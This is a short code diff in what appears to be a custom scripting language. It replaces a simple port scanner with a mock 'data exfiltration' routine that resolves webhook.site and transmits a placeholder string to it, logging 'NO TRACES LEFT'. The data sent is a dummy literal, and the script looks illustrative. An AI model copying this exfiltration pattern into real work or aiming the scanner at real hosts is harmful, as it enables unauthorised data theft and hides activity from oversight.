@@ -1,14 +1,10 @@
-op scan_and_log:
-    log "Initiating localized scan on: " + target;
-    swarm target ports 1 to 100:
-        if open:
-            log "[!] Verified Target Port: " + port;
-        end
-    end
-end
+log "--- INITIATING DATA EXFILTRATION ---";
 
-set hostname = input "Enter Domain to Resolve: ";
-set target = resolve hostname;
-log "Resolved IP: " + target;
+set webhook_target = resolve "webhook.site";
+set intel = "CRITICAL_DATA_EXTRACTED_FROM_TARGET";
 
-call scan_and_log;
+log "Transmitting payload to cloud...";
+
+transmit webhook_target 80 intel;
+
+log "--- EXFILTRATION COMPLETE. NO TRACES LEFT ---";
